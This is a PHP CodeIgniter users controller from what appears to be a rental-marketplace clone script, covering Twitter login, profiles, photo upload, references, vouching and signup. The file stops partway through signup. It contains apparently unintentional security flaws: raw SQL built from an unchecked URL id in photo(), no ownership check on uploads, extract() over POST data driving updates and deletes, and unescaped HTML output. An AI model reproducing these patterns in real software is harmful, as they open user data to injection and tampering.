<?php
/**
 * DROPinn Users Controller Class
 *
 * It helps to control the users profile
 *
 * @package		Dropinn
 * @subpackage	Controllers
 * @category	Users
 * @author		Cogzidel Product Team
 * @version		Version 1.6
 * @link		http://www.cogzidel.com
 
 */

if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Users extends CI_Controller
{
	// Used for registering and changing password form validation
	var $min_username = 4;
	var $max_username = 20;
	var $min_password = 4;
	var $max_password = 20;
	
	public function Users()
	{
		parent::__construct();
		$this->load->helper('url');
		$this->load->helper('cookie');
		$this->load->helper('form');
		$this->load->helper('file');
			$this->load->library('email');
		$this->load->helper('security');
		$this->load->library('form_validation');
		$this->load->library('twconnect');
   //include_once APPPATH."libraries/linkedin_OAuth/linkedClass.php";
	// $this->load->library('linkedin_OAuth/OAuth_linkedin');
		//$this->load->library('gpluslibrary');
		
		$this->load->model('Users_model');
		//load the model file

      $this->load->model('Contacts_model');	

           //end

		$this->load->model('Trips_model');
		$this->load->model('Email_model');
		$this->load->model('Message_model');
		$this->load->model('Referrals_model');
		$this->facebook_lib->enable_debug(TRUE);
	}
	
	  public function redirect() {
				
		$twitter_connection = $this->twconnect->twredirect('users/callback');
		

		if (!$twitter_connection) {
			$this->session->sess_destroy();
            echo 'Please wait...';
            echo '<script> location.reload(); </script>';
		}
	}


	
	public function callback() {
		

		$twitter_connection = $this->twconnect->twprocess_callback();
		
		if ( $twitter_connection ) 
		{
			 redirect('users/success'); 
		}
		else
		{
		  redirect ('users/failure');	
		} 
	}
	
	public function success()
	{
		 $twitter_id =  $this->twconnect->tw_user_id;
 		 $username = $this->twconnect->tw_user_name;
		$this->twconnect->twaccount_verify_credentials();
		$checknew_user = $this->Users_model->getUserStatusByTwitterUid($twitter_id);
		 $user_info = $this->twconnect->tw_user_info;
		 $names = explode(' ',$user_info->name);
		 if(isset($names[1]))
		 {
		 	 $last_name = $names[1];
			 $this->session->set_userdata('last_name',$last_name);
		 }
		 $first_name = $names[0];
		$this->session->set_userdata('first_name',$first_name);
		 if($user_info == '')
		 {
		 	redirect('users/signin');
		 }
		 $profile_url_large = str_replace("_normal","",$user_info->profile_image_url);
			
			$profile = array('image_url' => $profile_url_large );
			$this->session->set_userdata($profile); 
		if(!$checknew_user)
		{
			//$user_id = $this->Users_model->createTwitterUser($twitter_id,$username);
			
			
			$data['title']               = 'Twitter SignUp';
			$data['message_element']     = "users/view_popup";
			
			$this->load->view('template',$data);
			
			//echo "signup";
		}
		else 
		{
		
			$user_info = $this->Users_model->getUserInfobyTwitterid($twitter_id);
			$this->Users_model->TwitterUserLast($twitter_id);
			$user = array(					
			'DX_user_id'			 => $user_info['id'],
			'DX_username'			 => $user_info['username'],
			'DX_emailId'			 => $user_info['email'],
			'DX_role_id'			 => $user_info['role_id'],					
			'DX_logged_in'			 => TRUE
		);
	
		$this->session->set_userdata($user); 
		$this->Common_model->updateTableData('login_history',0,array('session_id'=>$this->session->userdata('session_id')),array('user_id'=>$this->dx_auth->get_user_id()));
		 $condition     = array("id" => $this->dx_auth->get_user_id());
						$data['via_login']= "twitter";
						$this->Common_model->updateTableData('users', NULL, $condition, $data);
		redirect('users/signup');
		
		}
		
		 
	}
	public function failure()
	{
		//echo '<p>Twitter connect failed</p>';
		redirect('users/signin');
	}
	public function edit()
	{

	//	if( ($this->dx_auth->is_logged_in()) || ($this->facebook_lib->logged_in()) || ($this->twitter->is_logged_in()) )
		if( ($this->dx_auth->is_logged_in()) || ($this->facebook_lib->logged_in()))
		{
		if($this->input->post())
		{
		  $this->form_validation->set_error_delimiters($this->config->item('field_error_start_tag'), $this->config->item('field_error_end_tag'));
				
				//$this->form_validation->set_rules('phnum', 'Phone', 'trim|xss_clean|min_length[10]|max_length[15]|numeric');
				//callback__check_phone_no
				$this->form_validation->set_rules('email', 'Email', 'trim|xss_clean|valid_email');
				
				$this->form_validation->set_rules('Fname', 'Fname','trim|xss_clean');
				$this->form_validation->set_rules('Lname', 'Lname','trim|xss_clean');
				$this->form_validation->set_rules('live', 'live', 'trim|xss_clean');
				$this->form_validation->set_rules('school','school', 'trim|xss_clean|alpha');
				$this->form_validation->set_rules('work', 'work', 'trim|xss_clean');
				$this->form_validation->set_rules('desc', 'desc', 'trim|xss_clean');
				
				if($this->input->post('emergency_status') == 1)
				{
				$this->form_validation->set_rules('emergency_name', 'Name', 'required|trim|xss_clean|alpha');
				$this->form_validation->set_rules('emergency_phone', 'Phone', 'required|trim|xss_clean|numeric|min_length[10]|max_length[15]');
				$this->form_validation->set_rules('emergency_email', 'Email', 'required|trim|xss_clean|valid_email');
				$this->form_validation->set_rules('emergency_relation', 'Relationship', 'required|trim|xss_clean|alpha');
				}
				
				if($this->form_validation->run())
	  	        {
	  	        	if($this->form_validation->run() && $this->input->post('emergency_status') == 1)
	  				$data['validation_status'] = 0;
					
					if($this->input->post('language') != '')
					{
						foreach($this->input->post('language') as $language)
						{
							$languages[] = $language;
						}
					}
										
						$data = array(
									'Fname'    => $this->input->post('Fname'),
									'Lname'    => $this->input->post('Lname'),
									'phnum'    => $this->input->post('phnum'),
									'live'     => $this->input->post('live'),
									'school'   => $this->input->post('school'),
									'gender'   => $this->input->post('gender'),
									'dob'      => $this->input->post('dob'),
									'work'     => $this->input->post('work'),
									'describe' => $this->input->post('desc'),
									'language' => join($languages,','),
									'emergency_status' => $this->input->post('emergency_status')
 								 );	
							 
						if($this->input->post('emergency_status') == 1)
						{
					 	 $data1['emergency_name'] = $this->input->post('emergency_name');  
					 	 $data1['emergency_phone'] = $this->input->post('emergency_phone');
					 	 $data1['emergency_email'] = $this->input->post('emergency_email');
						 $data1['emergency_relation'] = $this->input->post('emergency_relation');
						 $data = array_merge($data,$data1);
						}
						else 
						{
						 $data1['emergency_name'] = '';  
					 	 $data1['emergency_phone'] = '';
					 	 $data1['emergency_email'] = '';
						 $data1['emergency_relation'] = '';
						 $data = array_merge($data,$data1);
						}			
											
		$param     = $this->dx_auth->get_user_id();	
		
		$rows = $this->Common_model->getTableData('profiles', array('id' => $param))->num_rows();
				
					if($rows == 0)
					{
					$data['id']  = $param;
					$this->Common_model->insertData('profiles', $data);
					}
					else
					{
					$this->db->where('id', $param);
					$this->db->update('profiles', $data);
					}			
					
					$email_check = $this->db->where('email',$this->input->post('email'))->where('id',$this->dx_auth->get_user_id())->from('users')->get();
	  		    // print_r($email_check);
			 if($email_check->num_rows() != 1)
			 {
			 	$all_email_check = $this->db->where('email',$this->input->post('email'))->from('users')->get();
			   //print_r($all_email_check);
				if($all_email_check->num_rows() == 0)
				{
			 	$this->edit_email_verify($this->input->post('email'));
			    }	
             else {
	              $this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error',translate('Your New Email Address Already Used.')));
					redirect ('users/edit'); 
                  }
			 }
					$data2['email']    = $this->input->post('email');
					$data2['timezone'] = $this->input->post('timezones');
					$this->db->where('id', $param);
					$this->db->update('users', $data2);
					
					$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Information updated successfully.')));
					redirect ('users/edit'); 
				}
else {
	if($this->input->post('emergency_status') == 1)
	$data['validation_status'] = 1;
}
		}
		 $this->db->order_by('name','asc');
		 $data['languages'] = $this->Common_model->getTableData('language',array('status'=>1));
		 		 
		 $data['country'] = $this->Common_model->getTableData('country');
		 $data['user_id']             = $this->dx_auth->get_user_id();
		 $data['users'] = $this->Common_model->getTableData('users',array('id'=>$this->dx_auth->get_user_id()))->row();
		
		 $data['profile']             = $this->Common_model->getTableData('profiles', array('id' => $data['user_id']))->row();
    	
		if($data['profile']->language != '')
		{
			$explode_lang = explode(',',$data['profile']->language);
			$data['user_language_jquery'] = '';
			foreach($explode_lang as $row)
			{
				$language = $this->db->where('id',$row)->get('language')->row()->name;
		$data['user_language_jquery'] .= '<span class="multiselect-option" id="'.$row.'"> <span class="btn gray small btn-small row-space-1">'.$language.'&nbsp;<small><a class="text-normal" href="javascript:void(0);" style="color:inherit;"><i title="Remove from selection" class="fa fa-remove" onclick="hide('.$row.');" style="font-size:1.25em;"></i></a> </small></span>&nbsp;</span>';
		 	}
		}	
		 $data['user_language']	= explode(',',$data['profile']->language);
		 
		 $data['email_id']  		  = $this->Common_model->getTableData('users', array('id' => $data['user_id']))->row()->email;
		// print_r($data);
		 $data['title']               = get_meta_details('Edit_your_Profile','title');
		 $data["meta_keyword"]        = get_meta_details('Edit_your_Profile','meta_keyword');
		 $data["meta_description"]    = get_meta_details('Edit_your_Profile','meta_description');
		 $data['message_element']     = "users/view_edit_profile";
		 $this->load->view('template',$data);
		}
		else
		{
			redirect('users/signin');
		}	
	}

// mobile verification 1 start

// mobile verification 1 end
	
function _check_phone_no($value)
	{
		$value = trim($value);
		if ($value == '') 
		{
			return TRUE;
		}
	else
	{
		if (preg_match('/^\(?[0-9]{3}\)?[-. ]?[0-9]{3}[-. ]?[0-9]{4}$/', $value))
		{
			return preg_replace('/^\(?([0-9]{3})\)?[-. ]?([0-9]{3})[-. ]?([0-9]{4})$/', '($1) $2-$3', $value);
		}
		else
		{
			$this->form_validation->set_message('_check_phone_no', translate('Give a valid phone number'));
			return FALSE;
		}
	}
 }
 /* Without CDN 
public function photo($id = "")
	{		
			$target_path = realpath(APPPATH . '../images/users');

			if (!is_writable(dirname($target_path))) 
			{
				$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error',translate('Sorry! Destination folder is not writable.')));
				redirect('users/edit', 'refresh');
			}
        else
		{
				if(!is_dir( realpath(APPPATH . '../images/users').'/'.$id))
				{
					mkdir( realpath(APPPATH . '../images/users').'/'.$id, 0777, true);
				}
			
  			$target_path = $target_path .'/'.$id.'/userpic.jpg';
			
			
			
			if($_FILES['upload123']['name'] != '')
   			{
				move_uploaded_file($_FILES['upload123']['tmp_name'], $target_path);
				$thumb1 = realpath(APPPATH . '../images/users').'/'.$id.'/userpic_thumb.jpg';
				GenerateThumbFile($target_path,$thumb1,107,78);
				$thumb2 = realpath(APPPATH . '../images/users').'/'.$id.'/userpic_profile.jpg';
				//GenerateThumbFile($target_path,$thumb2,209,209);
				$thumb3 = realpath(APPPATH . '../images/users').'/'.$id.'/userpic_home.jpg';
				GenerateThumbFile($target_path,$thumb3,40,40);
				$this->db->query('update users set photo_status = 1 where id = '.$id);
				$thumb4 = realpath(APPPATH . '../images/users').'/'.$id.'/userpic_profile.jpg';
				
				$this->resize_from_center($target_path,$thumb4) ; 
				$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Your profile photo updated successfully.')));
				redirect('users/edit', 'refresh');
		 	}
			else
			{
				$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error',translate('Please browse your profile photo.')));
				redirect('users/edit', 'refresh');			
			}
		}
	}
*/

// ------ With CDN ----////


public function photo($id = "")
    {       
        require_once APPPATH.'libraries/cloudinary/autoload.php';
                \Cloudinary::config(array( 
                                "cloud_name" => cdn_name, 
                                "api_key" => cdn_api, 
                                "api_secret" => cloud_s_key
));
                        try{
                            $cloudimage=\Cloudinary\Uploader::upload($_FILES['upload123']['tmp_name'],
                            array(
                                 "public_id" => "images/users/".$id."/userpic",));
                             }
                         catch (Exception $e) {
                                $error = $e->getMessage();
                         }   
            $secureimage = $cloudimage['secure_url'];
            if($secureimage != '')
            {
                          
                $this->db->query('update users set photo_status = 1 where id = '.$id);
                $this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Your profile photo updated successfully.')));
               redirect('users/edit', 'refresh');
            }
            else
            {
                $this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error',translate('Please browse your profile photo.')));
                redirect('users/edit', 'refresh');          
            }
        
           
    }




//---------End----------///


function resize_from_center($target_path,$thumb4){
	
	$config = array();
	$config['image_library'] = 'gd2';
	$config['source_image'] = $target_path;
	$config['new_image'] = $thumb4;
    $config['maintain_ratio'] = TRUE;
    $config['master_dim']= 'auto';
    $config['quality']  = '100';
	$config['width'] = 225;
	$config['height'] = 225;
	$config['master_dim']= 'height';
	$this->load->library('image_lib');
	$this->image_lib->initialize($config);
	$this->image_lib->resize();
	
	list($current_width, $current_height) = getimagesize($thumb4);
	if( $current_width >= 225){
	$config = array();
	$config['image_library'] = 'gd2';
	$config['source_image'] = $thumb4;
	$config['new_image'] = $thumb4;
	$config['maintain_ratio'] = false;
	$config['x_axis'] = ($current_width / 2) - (225 / 2);
    $config['y_axis'] = ($current_height / 2) - (225 / 2);
	$config['height'] = 225;
	$config['width'] = 225;
	$config['quality']  = '100';
    $config['create_thumb'] = FALSE;
    $config['master_dim']= 'width';
	$this->load->library('image_lib');
	$this->image_lib->initialize($config);
	$this->image_lib->crop();
	}
}
public function references($param = '')
	{  
			//if( ($this->dx_auth->is_logged_in()) || ($this->facebook_lib->logged_in()) || ($this->twitter->is_logged_in()))
		if( ($this->dx_auth->is_logged_in()) || ($this->facebook_lib->logged_in()))
			{
		 	$this->load->library('email');
			
	   $username    = $this->dx_auth->get_username();
	   $user_id     = $this->dx_auth->get_user_id(); 

       if($this->uri->segment(3) == '')
	   {
	   if($this->input->post())
	   {

				$email       = $this->input->post('email_to_friend'); 
				$mail_list   = explode(',',$email);
								
				$admin_email = $this->dx_auth->get_site_sadmin();
			
				$email_name  = 'user_reference';
				
				$ref_id = $this->Common_model->getTableData('users',array('id'=>$user_id))->row()->ref_id;
				
				if($ref_id == '')
				{
					$data['ref_id'] = md5($username);
					$this->Common_model->updateTableData('users', NULL, array('id'=>$user_id), $data);
					$ref_id = $this->Common_model->getTableData('users',array('id'=>$user_id))->row()->ref_id;
				}
				
				$mailer_mode = $this->Common_model->getTableData('email_settings', array('code' => 'MAILER_MODE'))->row()->value;
				
				if($mailer_mode == 'html')
				$anchor      = anchor('users/vouch/'.$user_id.'?id='.$ref_id,translate('Click here'));
				else
				$anchor      = site_url('users/vouch/'.$user_id.'?id='.$ref_id);
				
				$splVars     = array("{site_name}" => $this->dx_auth->get_site_title(), "{username}" => ucfirst($username), "{click_here}" => $anchor);
					

				if(!empty($mail_list))
				{
								foreach($mail_list as $email_to)
								{  
									if($this->email->valid_email($email_to))
									{					
											//Send Mail
											$this->Email_model->sendMail($email_to,$admin_email,$this->dx_auth->get_site_title(),$email_name,$splVars);	
									}
									else
									{
										$data['email_status'][]=$email_to;
									}
								}	
						} 
					$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Mail sent successfully.')));		
				}	

		$conditions_req	 = array('userto' => $this->dx_auth->get_user_id(),'status'=>0);
			$data['recommends_request'] 	 = $this->Common_model->getTableData('reference_request', $conditions_req);
			
			if($data['recommends_request']->num_rows() != 0)
			{
				$data['by_you_count'] = $data['recommends_request']->num_rows();
			}
else {
	$data['by_you_count'] = '';
}

			$conditionsAbout_pending	 = array('userto' => $this->dx_auth->get_user_id(),'is_approval'=>0);
			$count_about	 = $this->Common_model->getTableData('recommends', $conditionsAbout_pending);
			
			if($count_about->num_rows() != 0)
			{
				$data['about_you_count'] = $count_about->num_rows();
			}
else {
	$data['about_you_count'] = '';
}
			
			$data['fb_app_id'] = $this->db->get_where('settings', array('code' => 'SITE_FB_API_ID'))->row()->string_value;
			$data['title']               = get_meta_details('Your_recommendation_details','title');
			$data["meta_keyword"]        = get_meta_details('Your_recommendation_details','meta_keyword');
			$data["meta_description"]    = get_meta_details('Your_recommendation_details','meta_description');
			
			$data['message_element']     = "users/view_references";
			$this->load->view('template',$data);
		}
else if($param == 'reference_by_you')
{
			$conditionsTo			 = array('userby' => $this->dx_auth->get_user_id());
			$data['recommends'] 	 = $this->Common_model->getTableData('recommends', $conditionsTo);
			
			$conditionsTo_pending	 = array('userby' => $this->dx_auth->get_user_id(),'is_approval'=>0);
			$data['recommends_pending'] 	 = $this->Common_model->getTableData('recommends', $conditionsTo_pending);
			
			$conditions_req	 = array('userto' => $this->dx_auth->get_user_id(),'status'=>0);
			$data['recommends_request'] 	 = $this->Common_model->getTableData('reference_request', $conditions_req);
	
			if($data['recommends_request']->num_rows() != 0)
			{
				$data['by_you_count'] = $data['recommends_request']->num_rows();
			}
else {
	$data['by_you_count'] = '';
}

			$conditionsAbout_pending	 = array('userto' => $this->dx_auth->get_user_id(),'is_approval'=>0);
			$count_about	 = $this->Common_model->getTableData('recommends', $conditionsAbout_pending);
			
			if($count_about->num_rows() != 0)
			{
				$data['about_you_count'] = $count_about->num_rows();
			}
else {
	$data['about_you_count'] = '';
}
			
			
			$data['title']               = get_meta_details('Your_recommendation_details','title');
			$data["meta_keyword"]        = get_meta_details('Your_recommendation_details','meta_keyword');
			$data["meta_description"]    = get_meta_details('Your_recommendation_details','meta_description');
			
			$data['message_element']     = "users/view_references_by";
			$this->load->view('template',$data);
}
else if($param == 'reference_about_you') 
{
			$conditionsFrom			 = array('userto' => $this->dx_auth->get_user_id(),'is_approval'=>1);
			$data['recommends'] 	 = $this->Common_model->getTableData('recommends', $conditionsFrom);
			
			$conditionsTo_pending	 = array('userto' => $this->dx_auth->get_user_id(),'is_approval'=>0);
			$data['recommends_pending'] 	 = $this->Common_model->getTableData('recommends', $conditionsTo_pending);
			
			
			$conditions_req	 = array('userto' => $this->dx_auth->get_user_id(),'status'=>0);
			$data['recommends_request'] 	 = $this->Common_model->getTableData('reference_request', $conditions_req);
			
			if($data['recommends_request']->num_rows() != 0)
			{
				$data['by_you_count'] = $data['recommends_request']->num_rows();
			}
else {
	$data['by_you_count'] = '';
}

			$conditionsAbout_pending	 = array('userto' => $this->dx_auth->get_user_id(),'is_approval'=>0);
			$count_about	 = $this->Common_model->getTableData('recommends', $conditionsAbout_pending);
			
			if($count_about->num_rows() != 0)
			{
				$data['about_you_count'] = $count_about->num_rows();
			}
else {
	$data['about_you_count'] = '';
}
			
			
			if($this->input->post())
			{
				extract($this->input->post());
				
				if($this->input->post('accept'))
				{
					$this->db->where('userby',$userby)->where('userto',$userto)->update('recommends',array('is_approval'=>1));
				    $this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Accepted successfully.')));
				    redirect('users/references/reference_about_you');
				}
				else
				{
					$this->db->where('userby',$userby)->where('userto',$userto)->delete('recommends');
					$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Ignore successfully.')));
					redirect('users/references/reference_about_you');
				}
				
			}
			
			
			$data['title']               = get_meta_details('Your_recommendation_details','title');
			$data["meta_keyword"]        = get_meta_details('Your_recommendation_details','meta_keyword');
			$data["meta_description"]    = get_meta_details('Your_recommendation_details','meta_description');
			$data['message_element']     = "users/view_references_about";
			$this->load->view('template',$data);
}

	 }
	 else
	 {
 		redirect('users/signin');
	 }

	}

function fun_friends_fb_id()
{
	
	$id = $this->input->post('fb_id');
	$name = $this->input->post('fb_name');
	$friends_count = $this->input->post('friends_count');
	
	$i=0;  // Count for fb user contained Lists
		
	if($id != '')
	{
	foreach($id as $fb_id)
	{
	
	$currenct_fb_id = $this->Common_model->getTableData('users',array('id'=>$this->dx_auth->get_user_id()))->row()->fb_id;
		
	$result = $this->db->select('*')->where('fb_id != ',$currenct_fb_id)->where('fb_id',$fb_id)->from('users')->get();
	
	if($result->num_rows() != 0)
	{
		if($i == 0)
		{	
	   echo '<div class="Box_Head msgbg"><h2>'.$this->dx_auth->get_site_title().' '.translate("Friends").'</h2></div>
         <div class="Box_Content">
		 <div id="message" style="display:none"></div>
       <ul class="list-layout row" id="fb_friends">
         ';
		}
		$user_id = $result->row()->id; 
		
		$username = $result->row()->username;
		
		$url = $this->Gallery->profilepic($user_id,2);
		
		$data['userto'] = $user_id;
		$data['userby'] = $this->dx_auth->get_user_id();
		
		$request_status = $this->Common_model->getTableData('reference_request',$data);
		
		if($request_status->num_rows() != 0)
		{
			$status = 'disabled';
			$request = 'Requested..';
		}
		else
			{
				$status = '';
				$request = 'Request';
			}

		echo '<li class="col-2 text-center row-space-4">
              <a href="/users/show/3252602" class="media-photo media-round">
              <img alt="'.$username.'" height="68" src="'.$url.'" title="'.$username.'" width="68">
			  </a>                
			  <div class="name">'.$username.'</div>
              <button id="'.$user_id.'" onclick="create_request('.$user_id.')" class="btn gotomsg" style="background-color:#000000 !important" '.$status.'>
              '.$request.'
              </button>
              <input type="hidden" name="user_id" value="'.$user_id.'">
			             
			  </li>';
	  $i++;
	}
	}
echo '</ul></div>';
}
if($i == 0)
{
	echo '<div><h2 style="font-size: 24px; line-height: 1.5;">'.translate('Looks like none of your friends have signed up for').' '.$this->dx_auth->get_site_title().' '.translate('yet.').'</h2></div>';
}
      
/*else {
	echo '<br><br><img src="'.base_url().'images/page2_spinner.gif">';
}*/
}

function create_reference_request()
{
	if($this->input->post())
	{
		$data['userto'] = $this->input->post('user_id');
		$data['userby'] = $this->dx_auth->get_user_id();
		$data['status'] = 0;
		$data['created'] = time();
		
		$this->Common_model->inserTableData('reference_request',$data);
		
		echo $data['userto'];exit;
		
	}
}


function reference_req_approval()
{
	if($this->input->post())
	{
		$id = $this->input->post('id');
		
		$data['status'] = 1;
		
		$this->db->where('id',$id)->update('reference_request',$data);
		
		redirect('users/references/reference_by_you');	
	}
}
		public function reviews()
	 {
		//if( ($this->dx_auth->is_logged_in()) || ($this->facebook_lib->logged_in()) || ($this->twitter->is_logged_in()) )
		if( ($this->dx_auth->is_logged_in()) || ($this->facebook_lib->logged_in()))
		{
		$conditionsFrom			 = array('userto' => $this->dx_auth->get_user_id());
		$conditionsBy  			 = array('userby' => $this->dx_auth->get_user_id());

		$data['reviewfrom']		 = $this->Trips_model->get_review($conditionsFrom);
		$data['recommendsfrom']  = $this->Common_model->getTableData('recommends', $conditionsFrom);
		
		$data['reviewby']	     = $this->Trips_model->get_review($conditionsBy);
		$data['recommendsby']	 = $this->Common_model->getTableData('recommends', $conditionsBy);
			
		$conditions    			 = array('userto' => $this->dx_auth->get_user_id());
		$data['stars']			 = $this->Trips_model->get_review_sum($conditions)->row();
		
		$data['title']           = get_meta_details('Your_Reviews_and_Recommendation','title');
		$data["meta_keyword"]    = get_meta_details('Your_Reviews_and_Recommendation','meta_keyword');
		$data["meta_description"]= get_meta_details('Your_Reviews_and_Recommendation','meta_description');
		
		$data['message_element']     = "users/view_reviews";
		$this->load->view('template',$data);
  }
	 else
	 {
		 redirect('users/signin');
	 }
	}	
	
	
	public function vouch()
	{  
	$param    = $this->uri->segment(3);
	
	if($param == '')
	{
	 redirect('info/deny');
	}
	 //Insert the Recommendation detial
		if($this->input->post())
		{
				if($this->input->post('userby') == $this->input->post('userto'))
				{
					$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error',translate('Sorry! You cannot recommend yourself.')));
					redirect('users/vouch/'.$param,'refresh');
				}
		$this->form_validation->set_rules('message', 'Recomment', 'required|trim|xss_clean');
		if($this->form_validation->run())
	  	{	
					$data['userby']           = $this->input->post('userby');
					$data['userto']           = $this->input->post('userto');
					$data['message']          = $this->input->post('message');
					$data['relationship']     = $this->input->post('relationship_type');
					
					$data1['recommends_check']    = $this->Common_model->getTableData( 'recommends', array( 'userto' => $this->input->post('userto'),'userby'=>$this->dx_auth->get_user_id()) );
		
					if($data1['recommends_check']->num_rows() != 0)
					{
						$this->db->where('userby',$data['userby'])->where('userto',$data['userto'])->update('recommends',$data);
					}
					else {
						$data['created']          = local_to_gmt();
						$this->Common_model->insertData('recommends', $data);
						
						$update['status'] = 1;
						$this->Common_model->updateTableData('reference_request',NULL,array('userby'=>$data['userto'],'userto'=>$data['userby']),$update);
						
						$user_data = $this->Common_model->getTableData('users',array('id'=>$data['userto']))->row();
						
						$email_name = 'reference_receive';
						$email_to = $user_data->email;
						
						$admin_email = $this->dx_auth->get_site_sadmin();
						
						$mailer_mode = $this->Common_model->getTableData('email_settings', array('code' => 'MAILER_MODE'))->row()->value;
				
						if($mailer_mode == 'html')
						$anchor      = anchor('users/references/reference_about_you',translate('Click here'));
						else
						$anchor      = site_url('users/references/reference_about_you');
						
						$other_username    = $this->dx_auth->get_username();
						
						$username = get_user_by_id($data['userto'])->username;
				
						$splVars     = array("{other_username}"=>$other_username,"{site_name}" => $this->dx_auth->get_site_title(), "{username}" => ucfirst($username), "{click_here}" => $anchor);
										
						//Send Mail
						$this->Email_model->sendMail($email_to,$admin_email,$this->dx_auth->get_site_title(),$email_name,$splVars);	
									
					}

					$check_request				 = $this->Common_model->getTableData( 'reference_request', array( 'userby' => $this->dx_auth->get_user_id(),'userto'=>$param) );
		
		if($check_request->num_rows() != 0)
		{
		$data_req['status'] = 1;
		
		$this->db->where('userto',$param)->where('userby',$this->dx_auth->get_user_id())->update('reference_request',$data_req);
		}
					
					$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Your recommend added successfully.')));
					redirect('users/vouch/'.$param,'refresh');
		}
		}
		$user_id                     = $param;
		$getUser					 = $this->Common_model->getTableData( 'users', array( 'id' => $user_id) );
		$data['user']                = $getUser->row();
				
		if($getUser->num_rows() <= 0)
		{
		 redirect('info/deny');
		}
		$query                   = $this->Common_model->getTableData( 'profiles',array('id' => $user_id) )->row();
		$data['phone_number'] = substr($query->phnum,-2);
		
		$data['lists']               = $this->Common_model->getTableData( 'list', array( 'user_id' => $user_id, "status =" => 1,"is_enable" => 1) );
		$data['recommends']          = $this->Common_model->getTableData( 'recommends', array( 'userto' => $user_id) );
		$data['recommends_check']    = $this->Common_model->getTableData( 'recommends', array( 'userto' => $user_id,'userby'=>$this->dx_auth->get_user_id()) );
		
		if($data['recommends_check']->num_rows() != 0)
		{
			$data['recommends_by_you']  = $this->Common_model->getTableData( 'recommends', array( 'userby' => $this->dx_auth->get_user_id()) );
		}
		
		$check_request				 = $this->Common_model->getTableData( 'reference_request', array( 'userto' => $this->dx_auth->get_user_id(),'userby'=>$param) );
		
		if($check_request->num_rows() != 0)
		{
			
		$data['reference_request'] = 1;
		
		}
		else {
			$data['reference_request'] = 0;
		}
	
		$data['reviews']          = $this->Common_model->getTableData( 'reviews', array( 'userto' => $user_id) );
		
		$data['profile']          = $this->Common_model->getTableData( 'profiles', array( 'id' => $user_id) )->row();
		
		$data['title']               = get_meta_details('Recommend_your_friends','title');
		$data["meta_keyword"]        = get_meta_details('Recommend_your_friends','meta_keyword');
		$data["meta_description"]    = get_meta_details('Recommend_your_friends','meta_description');
	 
		$data['message_element']     = "users/view_vouch";
		$this->load->view('template',$data);
	}
	
public function popup()
 {
	$this->load->view('template', $data);
 }

public function signup()
{
	
	
	if ($this->dx_auth->is_logged_in() || autologin() == 1)
	{
		  
      	   if($this->session->userdata('redirect_to')==FALSE){
      	   	redirect('home/dashboard');
    }
   else{
		   	
	   	redirect($this->session->userdata('redirect_to'));
     }
   } // End if
	if($this->input->post())
	{
		$this->form_validation->set_rules('first_name', 'First Name', 'required|trim|alpha|xss_clean|max_length[50]');
		$this->form_validation->set_rules('last_name', 'Last Name', 'required|trim|alpha|xss_clean|max_length[50]');
		$this->form_validation->set_rules('username','Username','required|trim|xss_clean|callback__check_user_name|max_length[50]');
		$this->form_validation->set_rules('email','Email','required|trim|valid_email|xss_clean|callback__check_user_email');
		$this->form_validation->set_rules('password','Password','required|trim|min_length[5]|max_length[16]|xss_clean|matches[confirmpassword]');
		$this->form_validation->set_rules('confirmpassword','Confirm Password','required|trim|min_length[5]|max_length[16]|xss_clean');
	
		if($this->form_validation->run())
		{ 	
		//Get the post values
		$first_name        = $this->input->post('first_name');
		$last_name         = $this->input->post('last_name');
		$username          = $this->input->post('username');
		$email             = $this->input->post('email');
		$password          = $this->input->post('password');
		$confirmpassword   = $this->input->post('confirmpassword');
		$newsletter   	   = $this->input->post('news_letter');
		
		$data = $this->dx_auth->register($username, $password, $email);
		
		$this->dx_auth->login($username, $password, 'TRUE');
		//To check user come by reference
		
				if($this->session->userdata('ref_id'))
		$ref_id      = $this->session->userdata('ref_id');
		else
		$ref_id      = "";
		
		if(!empty($ref_id))
		{
		$details     = $this->Referrals_model->get_user_by_refId($ref_id);

					$invite_from = $details->row()->id;
		
						$insertData                    = array();
						$insertData['invite_from']     = $invite_from;
						$insertData['invite_to']       = $this->dx_auth->get_user_id();
						$insertData['join_date']       = local_to_gmt();
						
						$this->Referrals_model->insertReferrals($insertData);
						/*
						$email_name = 'User_join_to_Referal_mail';
		$splVars    = array("{site_name}" => $this->dx_auth->get_site_title(),"{friend_name}" => $first_name);
						//Send Mail to refeeral user
						$this->Email_model->send_ref_user($email_user,$admin_email,ucfirst($admin_name),$email_name,$splVars); */

   			
   			$this->session->unset_userdata('ref_id');
			}
						$referral_code['referral_code']     = $this->session->userdata('referral_code');
		
			 $refer_userid_ref = $this->db->select('id')->where('referral_code',$referral_code['referral_code'])->get('users')->row()->id;
		$refer=$this->db->query("select * from `referral_management` where `id`=1 ")->row();
		$refamt=$refer->fixed_amt;
		$refcur=$refer->currency;
		$type=$refer->type;
		$trip_amt=$refer->trip_amt;
		$trip_per=$refer->trip_per;
		$rent_amt=$refer->rent_amt;
		$rent_per=$refer->rent_per;
		$ref_total=get_currency_value2($refcur,'USD',$refamt);
		if($type==1){
			$trip_amt0=$trip_amt;
			$rent_amt0=$rent_amt;
		$trip=get_currency_value2($refcur,'USD',$trip_amt);
		$rent=get_currency_value2($refcur,'USD',$rent_amt);
		}
		if($type==0){
			$trip=(($trip_per)/100)*$ref_total;
			$rent=(($rent_per)/100)*$ref_total;
		$current = $this->session->userdata("locale_currency");
			
		}	
$this->db->set('trips_referral_code',$referral_code['referral_code'])->where('id',$this->dx_auth->get_user_id())->update('users');
$this->db->set('list_referral_code',$referral_code['referral_code'])->where('id',$this->dx_auth->get_user_id())->update('users');
$this->db->set('refer_userid',$refer_userid_ref)->where('id',$this->dx_auth->get_user_id())->update('users');
$this->db->set('ref_total',$ref_total)->where('id',$this->dx_auth->get_user_id())->update('users');
$this->db->set('ref_trip',$trip)->where('id',$this->dx_auth->get_user_id())->update('users');
